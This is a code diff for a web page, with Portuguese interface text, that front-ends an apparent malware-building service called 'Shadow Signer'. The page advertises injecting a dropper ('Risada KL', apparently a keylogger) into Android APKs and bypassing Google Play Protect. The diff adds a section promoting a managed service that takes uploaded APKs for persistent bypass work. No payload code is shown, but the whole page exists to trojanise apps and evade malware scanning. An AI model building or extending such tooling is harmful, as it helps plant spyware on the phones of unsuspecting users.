@@ -1,9 +1,9 @@
-import { createFileRoute } from "@tanstack/react-router";
+import { createFileRoute, Link } from "@tanstack/react-router";
 import { useState, useEffect } from "react";
 import { useSuspenseQuery, useQueryClient } from "@tanstack/react-query";
 import { useServerFn } from "@tanstack/react-start";
 import { motion, AnimatePresence } from "framer-motion";
-import { ShieldCheck, Upload, Loader2, Download, AlertTriangle, CheckCircle2, RefreshCcw, Smartphone, Settings, Info } from "lucide-react";
+import { ShieldCheck, Upload, Loader2, Download, AlertTriangle, CheckCircle2, RefreshCcw, Smartphone, Settings, Info, ArrowRight, ShieldAlert } from "lucide-react";
 import { SidebarProvider, SidebarInset } from "@/components/ui/sidebar";
 import { AppSidebar } from "@/components/AppSidebar";
 import { Button } from "@/components/ui/button";
@@ -151,8 +151,8 @@ function PlayProtectPage() {
               animate={{ opacity: 1, y: 0 }}
               className="mb-8"
             >
-              <h1 className="rainbow-text font-display text-3xl font-bold tracking-tight">Shadow Signer & Play Protect Cloak</h1>
-              <p className="mt-2 text-muted-foreground">O sistema definitivo para injeção de dropper (Risada KL) e bypass total do Play Protect com assinatura de longa duração.</p>
+              <h1 className="rainbow-text font-display text-3xl font-bold tracking-tight">Shadow Signer (Public Builder)</h1>
+              <p className="mt-2 text-muted-foreground">O console automatizado para injeção de dropper (Risada KL) e bypass total do Play Protect.</p>
               {!hasAccess && (
                 <div className="mt-4 flex items-center gap-2 rounded border border-amber-500/30 bg-amber-500/10 p-3 text-xs text-amber-200/90">
                   <AlertTriangle className="h-4 w-4 text-amber-500" />
@@ -321,6 +321,22 @@ function PlayProtectPage() {
                   )}
                 </div>
               </div>
+            </div>
+
+            <div className="mt-12 rounded-lg border border-violet/40 bg-violet/5 p-6">
+              <div className="flex items-center gap-3 mb-4">
+                <ShieldAlert className="h-6 w-6 text-violet" />
+                <h2 className="text-xl font-bold font-display">Serviço Gerenciado (Play Protect Cloak)</h2>
+              </div>
+              <p className="text-muted-foreground text-sm mb-6">
+                Precisa de um bypass manual persistente ou suporte para APKs complexos? 
+                O serviço gerenciado permite que você envie o arquivo para nossa equipe processar.
+              </p>
+              <Link to="/dashboard" search={{ tab: "play-protect" }}>
+                <Button variant="outline" className="font-mono uppercase tracking-widest border-violet/40 hover:bg-violet/10">
+                  Acessar Fila de Envios <ArrowRight className="ml-2 h-4 w-4" />
+                </Button>
+              </Link>
             </div>
           </main>
         </SidebarInset>
